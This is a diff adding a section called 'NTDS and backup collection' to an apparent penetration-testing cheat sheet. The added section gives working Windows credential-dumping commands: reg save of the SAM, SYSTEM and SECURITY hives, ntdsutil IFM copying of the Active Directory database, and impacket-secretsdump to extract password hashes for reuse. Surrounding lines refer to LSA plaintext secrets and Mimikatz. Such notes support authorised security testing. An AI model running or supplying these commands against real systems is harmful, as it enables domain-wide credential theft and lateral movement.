@@ -42,6 +42,24 @@ impacket-secretsdump -ntds NTDS.dit -system SYSTEM LOCAL
 
 LSA `DefaultPassword` and `_SC_*` entries are plaintext pivots; SAM lines give local hashes; cached `$DCC2$` lines crack offline. [Impacket secretsdump](https://github.com/fortra/impacket/blob/master/examples/secretsdump.py).
 
+## NTDS and backup collection
+
+Use when administrator or backup rights permit host-side collection. Prefer the least destructive source and record where every file came from.
+
+```cmd
+reg save HKLM\SAM sam.hive
+reg save HKLM\SYSTEM system.hive
+reg save HKLM\SECURITY security.hive
+ntdsutil.exe "activate instance ntds" "ifm" "create full C:\Windows\Temp\IFM" quit quit
+```
+
+```bash
+impacket-secretsdump -sam sam.hive -system system.hive -security security.hive LOCAL
+impacket-secretsdump -ntds NTDS.dit -system system.hive LOCAL
+```
+
+A live IFM path can also be copied back for offline parsing. Verify the recovered hashes against the intended hosts before reuse.
+
 ## Mimikatz logon passwords
 
 Run in the target session as administrator or SYSTEM:
